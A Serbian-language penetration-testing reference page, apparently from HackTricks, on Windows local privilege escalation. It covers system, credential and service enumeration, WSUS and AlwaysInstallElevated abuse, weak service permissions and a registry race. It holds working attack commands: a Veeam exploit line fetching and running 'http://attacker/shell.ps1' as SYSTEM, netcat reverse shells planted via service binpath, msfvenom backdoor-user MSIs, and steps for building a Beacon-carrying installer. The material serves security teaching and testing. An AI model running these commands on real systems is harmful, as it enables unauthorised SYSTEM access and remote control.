# Windows lokalna eskalacija privilegija

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje vektora lokalne eskalacije privilegija na Windowsu:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Osnovna teorija Windowsa

### Access Tokens

**Ako ne znate šta su Windows Access Tokens, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Pogledajte sledeću stranicu za više informacija o ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ako ne znate šta su integrity levels u Windowsu, trebalo bi da pročitate sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows bezbednosne kontrole

U Windowsu postoje različite stvari koje bi mogle da **spreče enumeraciju sistema**, pokretanje izvršnih datoteka ili čak **otkriju vaše aktivnosti**. Trebalo bi da **pročitate** sledeću **stranicu** i **enumerišete** sve ove **odbrambene** **mehanizme** pre nego što započnete enumeraciju za eskalaciju privilegija:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess procesi pokrenuti kroz `RAiLaunchAdminProcess` mogu biti zloupotrebljeni za dostizanje High IL bez promptova kada se zaobiđu AppInfo secure-path provere. Pogledajte namenski workflow za zaobilaženje UIAccess/Admin Protection ovde:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagacija accessibility registarskih podešavanja kroz Secure Desktop može biti zloupotrebljena za proizvoljan SYSTEM upis u registry (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije Windows verzije takođe su uvele **SMB arbitrary-port** LPE putanju, pri kojoj se privilegovana lokalna NTLM autentikacija reflektuje preko ponovo iskorišćene SMB TCP konekcije:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li Windows verzija ima neku poznatu ranjivost (proverite i primenjene zakrpe).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Eksploiti verzija

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pretragu detaljnih informacija o Microsoft security ranjivostima. Ova baza podataka sadrži više od 4.700 security ranjivosti, što pokazuje **ogromnu attack surface** koju Windows okruženje predstavlja.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima ugrađen watson)_

**Lokalno sa informacijama o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repozitorijumi eksploita:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su neki credential/Juicy podaci sačuvani u env promenljivama?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell istorija
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript datoteke

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Detalji izvršavanja PowerShell pipeline-a se beleže, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, potpuni detalji izvršavanja i rezultati izlaza možda neće biti zabeleženi.

Da biste ovo omogućili, pratite uputstva u odeljku dokumentacije „Transcript files“ i izaberite **„Module Logging“** umesto **„Powershell Transcription“**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Da biste pregledali poslednjih 15 događaja iz PowerShell logova, možete izvršiti:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Beleži se kompletna aktivnost i puni sadržaj izvršavanja skripte, čime se obezbeđuje dokumentovanje svakog bloka koda tokom njegovog izvršavanja. Ovaj proces čuva sveobuhvatan audit trag svake aktivnosti, što je korisno za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja pružaju se detaljni uvidi u proces.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Događaji evidentiranja za Script Block mogu se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste prikazali poslednjih 20 događaja, možete koristiti:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Podešavanja interneta
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Diskovi
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Možete kompromitovati sistem ako se ažuriranja ne zahtevaju preko http**S**, već preko http.

Počnite proverom da li mreža koristi WSUS ažuriranja bez SSL-a tako što ćete u cmd pokrenuti sledeće:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ili sledeće u PowerShell-u:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ako dobijete odgovor kao što je neki od ovih:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
A ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Onda je **moguće izvršiti exploit.** Ako je poslednji registry ključ jednak `0`, WSUS unos će biti zanemaren.

Da biste iskoristili ove ranjivosti, možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Ovo su weaponized MiTM exploit skripte za ubacivanje „lažnih“ ažuriranja u WSUS saobraćaj koji nije zaštićen SSL-om.

Istraživanje pročitajte ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Kompletan izveštaj pročitajte ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
U osnovi, ovo je propust koji ovaj bug iskorišćava:

> Ako imamo mogućnost da izmenimo proxy lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u podešavanjima Internet Explorer-a, onda imamo mogućnost da lokalno pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus) kako bismo presreli sopstveni saobraćaj i pokrenuli kod kao privilegovani korisnik na našem asset-u.
>
> Pored toga, pošto WSUS servis koristi podešavanja trenutnog korisnika, koristiće i njegov certificate store. Ako generišemo self-signed certificate za WSUS hostname i dodamo taj certificate u certificate store trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme slične HSTS-u za implementaciju validacije tipa trust-on-first-use za certificate. Ako je predstavljeni certificate pouzdan korisniku i ima ispravan hostname, servis će ga prihvatiti.

Ovu ranjivost možete iskoristiti pomoću alata [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Mnogi enterprise agenti izlažu localhost IPC površinu i privilegovani kanal za ažuriranje. Ako enrollment može biti prisiljen da koristi attacker server, a updater veruje rogue root CA-u ili ima slabe provere signer-a, lokalni korisnik može da isporuči malicious MSI koji SYSTEM servis instalira. Generalizovanu tehniku (zasnovanu na Netskope stAgentSvc chain-u – CVE-2025-0309) pogledajte ovde:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM preko TCP 9401)

Veeam B&R < `11.0.1.1261` izlaže localhost servis na **TCP/9401** koji obrađuje poruke pod kontrolom napadača, što omogućava izvršavanje proizvoljnih komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: potvrdite listener i verziju, npr. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: postavite PoC kao što je `VeeamHax.exe`, zajedno sa potrebnim Veeam DLL-ovima u istom direktorijumu, a zatim pokrenite SYSTEM payload preko lokalnog socket-a:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Servis izvršava komandu kao SYSTEM.
## KrbRelayUp

U Windows **domen** okruženjima, pod određenim uslovima, postoji ranjivost **lokalne eskalacije privilegija**. Ti uslovi obuhvataju okruženja u kojima **LDAP signing nije nametnut,** korisnici imaju sopstvena prava koja im omogućavaju da konfigurišu **Resource-Based Constrained Delegation (RBCD),** kao i mogućnost da korisnici kreiraju računare unutar domena. Važno je napomenuti da su ovi **zahtevi** ispunjeni korišćenjem **podrazumevanih podešavanja**.

Pronađite **exploit na** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ako** su ova 2 registra **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim nivoom privilegija mogu da **instaliraju** (izvrše) `*.msi` datoteke kao NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ako imate meterpreter sesiju, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz power-up-a da biste u trenutnom direktorijumu kreirali Windows MSI binary za eskalaciju privilegija. Ova skripta ispisuje unapred kompajlirani MSI installer koji zahteva dodavanje korisnika/grupe (zato će vam biti potreban GIU pristup):
```
Write-UserAddMSI
```
Samo izvršite kreirani binary da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj tutorial da biste naučili kako da kreirate MSI wrapper pomoću ovih tools. Imajte na umu da možete obmotati "**.bat**" fajl ako samo želite da **izvršite** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Kreiranje MSI-ja pomoću WIX-a


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Kreiranje MSI-ja pomoću Visual Studio-a

- Pomoću Cobalt Strike-a ili Metasploit-a **generišite** **novi Windows EXE TCP payload** u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i unesite "installer" u polje za pretragu. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Dodelite projektu ime, na primer **AlwaysPrivesc**, koristite **`C:\privesc`** kao lokaciju, izaberite **place solution and project in the same directory** i kliknite na **Create**.
- Klikćite na **Next** dok ne dođete do koraka 3 od 4 (izbor fajlova za uključivanje). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer-u** i u odeljku **Properties** promenite **TargetPlatform** sa **x86** na **x64**.
- Postoje i druga svojstva koja možete promeniti, kao što su **Author** i **Manufacturer**, čime instalirana aplikacija može izgledati legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite fajl **beacon.exe** i kliknite na **OK**. Time ćete obezbediti da se Beacon payload izvrši čim se installer pokrene.
- U odeljku **Custom Action Properties** promenite **Run64Bit** na **True**.
- Na kraju, **build-ujte ga**.
- Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste platformu podesili na x64.

### MSI instalacija

Da biste **installation** malicioznog `.msi` fajla izvršili **u pozadini:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Za iskorišćavanje ove ranjivosti možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

### Podešavanja revizije

Ova podešavanja određuju šta se **evidentira**, zato obratite pažnju na njih.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, korisno je znati gde se šalju logovi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** je dizajniran za **upravljanje lozinkama lokalnog Administrator naloga**, čime se obezbeđuje da svaka lozinka bude **jedinstvena, nasumično generisana i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u okviru Active Directory-ja i mogu im pristupiti samo korisnici kojima su putem ACL-ova dodeljene dovoljne dozvole, što im omogućava da vide lozinke lokalnog administratora ako su za to ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u čistom tekstu čuvaju se u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Počevši od **Windows 8.1**, Microsoft je uveo poboljšanu zaštitu za Lokalni bezbednosni autoritet (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubacuju kod, čime se sistem dodatno obezbeđuje.\
[**Više informacija o LSA Protection ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti akreditive sačuvane na uređaju od pretnji kao što su pass-the-hash napadi.| [**Više informacija o Credentials Guard ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Keširani akreditivi

**Domenski akreditivi** se autentifikuju pomoću **Local Security Authority** (LSA) i koriste ih komponente operativnog sistema. Kada se korisnički podaci za prijavljivanje autentifikuju pomoću registrovanog bezbednosnog paketa, domenski akreditivi za korisnika se obično uspostavljaju.\
[**Više informacija o keširanim akreditivima ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Korisnici i grupe

### Enumerisanje korisnika i grupa

Trebalo bi da proverite da li neka od grupa kojoj pripadate ima zanimljive dozvole
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda ćete moći da eskalirate privilegije**. Saznajte više o privilegovanim grupama i načinima njihove zloupotrebe za eskalaciju privilegija ovde:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali više o zanimljivim tokenima** i načinima njihove zloupotrebe:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / sesije
```bash
qwinsta
klist sessions
```
### Početne fascikle
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politika lozinki
```bash
net accounts
```
### Preuzmite sadržaj međuspremnika
```bash
powershell -command "Get-Clipboard"
```
## Pokrenuti procesi

### Dozvole za fajlove i fascikle

Pre svega, prilikom izlistavanja procesa **proverite da li se lozinke nalaze unutar komandne linije procesa**.\
Proverite da li možete **da prepišete neki binarni fajl koji se izvršava** ili da li imate dozvole za pisanje u fasciklu binarnog fajla kako biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md), možete ih zloupotrebiti za eskalaciju privilegija.

**Provera dozvola nad binarnim fajlovima procesa**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Provera dozvola fascikli binarnih datoteka procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Izdvajanje lozinki iz memorije

Možete kreirati memory dump pokrenutog procesa pomoću alata **procdump** iz sysinternals-a. Servisi kao što je FTP imaju **credentials u čistom tekstu u memoriji**; pokušajte da izvršite dump memorije i pročitate credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Nesigurne GUI aplikacije

**Aplikacije koje se pokreću kao SYSTEM mogu omogućiti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: "Windows Help and Support" (Windows + F1), pretražite "command prompt", kliknite na "Click to open Command Prompt"

## Servisi

Service Triggers omogućavaju Windowsu da pokrene servis kada se ispune određeni uslovi (aktivnost named pipe/RPC endpoint-a, ETW događaji, dostupnost IP adrese, priključivanje uređaja, osvežavanje GPO-a itd.). Čak i bez SERVICE_START prava često možete pokrenuti privilegovane servise aktiviranjem njihovih triggera. Pogledajte tehnike enumeracije i aktivacije ovde:

-
{{#ref}}
service-triggers.md
{{#endref}}

Preuzmite listu servisa:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu
```bash
sc qc <service_name>
```
Preporučuje se da imate binarni fajl **accesschk** iz _Sysinternals_ za proveru potrebnog nivoa privilegija za svaki servis.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Preporučuje se proveriti da li grupa "Authenticated Users" može da menja bilo koji service:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Možete preuzeti accesschk.exe za XP ovde](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako dobijate ovu grešku (na primer sa SSDPSRV):

_Sistemska greška 1058 se pojavila._\
_Servis ne može da se pokrene zato što je onemogućen ili zato što nijedan uređaj povezan sa njim nije omogućen._

Možete ga omogućiti koristeći
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Imajte u vidu da servis upnphost zavisi od SSDPSRV da bi radio (za XP SP1)**

**Drugo rešenje** ovog problema je pokretanje:
```
sc.exe config usosvc start= auto
```
### **Izmena putanje binarne datoteke servisa**

U scenariju u kojem grupa „Authenticated users“ poseduje **SERVICE_ALL_ACCESS** nad servisom, moguće je izmeniti izvršnu binarnu datoteku servisa. Za izmenu i izvršavanje **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Ponovno pokretanje servisa
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegije se mogu eskalirati putem različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava rekonfiguraciju binarnog fajla servisa.
- **WRITE_DAC**: Omogućava rekonfiguraciju dozvola, što dovodi do mogućnosti menjanja konfiguracija servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i rekonfiguraciju dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost menjanja konfiguracija servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost menjanja konfiguracija servisa.

Za detekciju i eksploataciju ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole binarnih fajlova servisa

Ako servis radi kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili privilegovani domen nalog, ali **korisnici sa niskim privilegijama mogu da menjaju EXE servisa ili njegovu nadređenu fasciklu**, servis se često može preoteti **zamenom binarnog fajla i ponovnim pokretanjem servisa**.

**Proverite da li možete da menjate binarni fajl koji izvršava servis** ili da li imate **dozvole za upis u fasciklu** u kojoj se binarni fajl nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Sve binarne fajlove koje servis izvršava možete dobiti pomoću **wmic** (ne u system32), a svoje dozvole proveriti pomoću **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Možete koristiti i **sc** i **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Potražite opasne ACL-ove dodeljene entitetima **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, naročito **`(F)`**, **`(M)`** ili **`(W)`** dozvole nad izvršnom datotekom servisa ili direktorijumom koji je sadrži. Praktičan tok zloupotrebe je:<sup>[[27]](#references)</sup>

1. Potvrdite servisni nalog i putanju do izvršne datoteke pomoću `sc qc <service_name>`.
2. Potvrdite da je binarna datoteka upisiva pomoću `icacls <path>`.
3. Zamenite binarnu datoteku servisa payload-om ili validnom zlonamernom servisnom binarnom datotekom.
4. Ponovo pokrenite servis pomoću `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / okidač servisa).

Korisne automatizovane provere:<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Ako servis ne dozvoljava običnom korisniku da ga ponovo pokrene, proverite da li se automatski pokreće pri podizanju sistema, da li ima radnju u slučaju greške koja ga ponovo pokreće ili da li aplikacija koja ga koristi može indirektno da ga pokrene.

### Dozvole za izmenu service registry-ja

Trebalo bi da proverite da li možete da izmenite neki service registry.\
Možete da **proverite** svoje **dozvole** nad service **registry-jem** na sledeći način:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole `FullControl`. Ako je to slučaj, binarna datoteka koju servis izvršava može biti izmenjena.

Da biste promenili putanju binarne datoteke koju servis izvršava:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race za proizvoljan upis vrednosti u HKLM (ATConfig)

Neke Windows Accessibility funkcije kreiraju **ATConfig** ključeve po korisniku koje SYSTEM proces kasnije kopira u HKLM session ključ. Registry **symbolic link race** može preusmeriti taj privilegovani upis na **bilo koju HKLM putanju**, čime se dobija primitiv za **upis proizvoljne vrednosti** u HKLM.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` navodi instalirane Accessibility funkcije.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva konfiguraciju kojom upravlja korisnik.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijavljivanja/transition-a secure desktop-a i korisnik može da upisuje u njega.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Postavite vrednost **HKCU ATConfig** koju želite da SYSTEM upiše.
2. Pokrenite secure-desktop copy (npr. **LockWorkstation**), čime se pokreće AT broker flow.
3. **Pobedite u race-u** postavljanjem **oplock-a** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite **HKLM Session ATConfig** ključ registry link-om ka zaštićenom HKLM target-u.
